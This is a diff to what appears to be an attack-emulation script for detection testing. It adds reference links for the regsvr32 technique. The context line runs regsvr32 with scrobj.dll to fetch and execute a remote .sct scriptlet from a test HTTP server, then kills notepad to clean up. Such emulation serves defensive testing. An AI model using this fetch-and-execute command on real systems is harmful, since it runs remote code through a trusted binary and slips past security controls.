@@ -5,6 +5,9 @@
 
 import common
 
+# Ref. regsvr32
+#      https://en.wikipedia.org/wiki/Regsvr32
+#      https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
 
 @common.dependencies(common.get_path("bin", "notepad.sct"))
 def main():
@@ -15,6 +18,7 @@ def main():
     uri = 'bin/notepad.sct'
     url = 'http://%s:%d/%s' % (ip, port, uri)
 
+    # Ref. https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
     common.execute(["regsvr32.exe", "/u", "/n", "/s", "/i:%s" % url, "scrobj.dll"])
     common.log("Killing all notepads to cleanup", "-")
     common.execute(["taskkill", "/f", "/im", "notepad.exe"])
